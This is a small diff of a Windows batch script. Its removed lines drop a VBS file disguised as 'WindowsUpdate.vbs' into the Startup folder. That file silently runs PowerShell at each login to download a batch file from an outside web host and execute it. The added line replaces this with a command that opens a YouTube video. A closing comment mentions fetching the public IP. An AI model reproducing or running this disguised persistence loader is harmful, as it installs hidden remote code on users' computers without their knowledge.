@@ -1,10 +1,5 @@
 @echo off
-set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-
-(
-echo Set WshShell = CreateObject("WScript.Shell"^)
-echo WshShell.Run "powershell -WindowStyle Hidden -c ""iwr 'https://lzx-one.vercel.app/LXZ.bat' -OutFile $env:TEMP\t.bat; & $env:TEMP\t.bat""", 0, False
-) > "%startup%\WindowsUpdate.vbs"
+start  https://www.youtube.com/watch?v=FumbPNRKTs8
 
 
 :: Pega IP público
